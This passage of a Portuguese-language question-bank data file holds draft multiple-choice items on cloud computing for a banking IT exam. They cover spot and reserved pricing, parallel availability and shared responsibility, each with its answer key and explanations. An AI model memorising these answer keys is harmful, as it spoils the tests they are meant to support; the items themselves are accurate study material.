  "comentario": "**Gabarito: C.** **Spot/preemptível** oferece grande desconto sobre capacidade ociosa, mas pode ser interrompido — ideal para lotes tolerantes a falhas. **Reservado/savings plan** dá desconto em troca de compromisso de 1 a 3 anos — ideal para carga estável.\n\n(A) Sob demanda é o mais caro para cargas previsíveis. (B) Inverte as escolhas. (D) Reservar para um lote noturno paga por capacidade ociosa no resto do dia. (E) Interrupções no banco do core são inaceitáveis.\n\nRevisar: Apostila 07, §2.6.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-NUVEM-V006",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Computação em nuvem",
  "topico": "Nuvem na prática: responsabilidade compartilhada, elasticidade, alta disponibilidade, s…",
  "ref_apostila": {
    "modulo": "07",
    "secao": "2",
    "titulo": "Nuvem na prática: responsabilidade compartilhada, elasticidade, alta disponibilidade, serverless, custos e nuvem no setor bancário",
    "link": "[[07 - Nuvem, TypeScript e Front-end moderno#2. Nuvem na prática: responsabilidade compartilhada, elasticidade, alta disponibilidade, serverless, custos e nuvem no setor bancário]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 07 §2.3",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Uma aplicação foi distribuída em duas zonas de disponibilidade, cada uma com uma instância de disponibilidade 99,5%, atrás de um balanceador. Supondo falhas independentes, que o balanceador não falha e que basta uma instância ativa para atender, a disponibilidade resultante é de aproximadamente",
  "imagem": null,
  "alternativas": {
    "A": "99,0025%.",
    "B": "99,5000%.",
    "C": "99,7500%.",
    "D": "99,9975%.",
    "E": "100,0000%."
  },
  "gabarito": "D",
  "comentario": "**Gabarito: D.** Em paralelo, o serviço só cai se **as duas** instâncias falharem: indisponibilidade = 0,005 × 0,005 = 0,000025 → disponibilidade = 1 − 0,000025 = **99,9975%**.\n\n(A) 99,0025% é o produto 0,995 × 0,995, que vale para componentes em **série**. (B) Ignora a redundância. (C) Soma metade da indisponibilidade de forma indevida. (E) Redundância reduz, mas não elimina, a chance de falha.\n\nConta conferida em `tools/verificacao/agente4/verif_nuvem.py`.\n\nRevisar: Apostila 07, §2.3.",
  "tags": [
    "calculo"
  ],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-NUVEM-V007",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Computação em nuvem",
  "topico": "Computação em nuvem: definição NIST, características, modelos de serviço e de implantação",
  "ref_apostila": {
    "modulo": "07",
    "secao": "1",
    "titulo": "Computação em nuvem: definição NIST, características, modelos de serviço e de implantação",
    "link": "[[07 - Nuvem, TypeScript e Front-end moderno#1. Computação em nuvem: definição NIST, características, modelos de serviço e de implantação]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 07 §1.3",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Um banco passou a usar um serviço de banco de dados relacional gerenciado (DBaaS) de um provedor de nuvem pública. No modelo de responsabilidade compartilhada, permanece com o banco (cliente)",
  "imagem": null,
  "alternativas": {
    "A": "a aplicação de patches no sistema operacional dos servidores do banco de dados.",
    "B": "a substituição de discos com defeito no data center.",
    "C": "a manutenção do hipervisor que hospeda as instâncias.",
    "D": "a classificação e a proteção dos dados, a gestão de usuários e permissões de acesso e a configuração de criptografia e de exposição de rede da instância.",
    "E": "a redundância de energia das zonas de disponibilidade."
  },
  "gabarito": "D",
  "comentario": "**Gabarito: D.** Em qualquer modelo, **dados, identidades e acessos** continuam com o cliente, assim como as configurações do serviço (criptografia, regras de rede, exposição pública). Em um serviço gerenciado, o provedor cuida do SO, do motor do banco, de patches e de backups automatizados conforme o serviço.\n\n(A) No DBaaS o SO dos servidores do banco é administrado pelo provedor. (B) Hardware é do provedor. (C) O hipervisor é do provedor. (E) Energia e redundância das zonas são do provedor.\n\nRevisar: Apostila 07, §1.3.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});
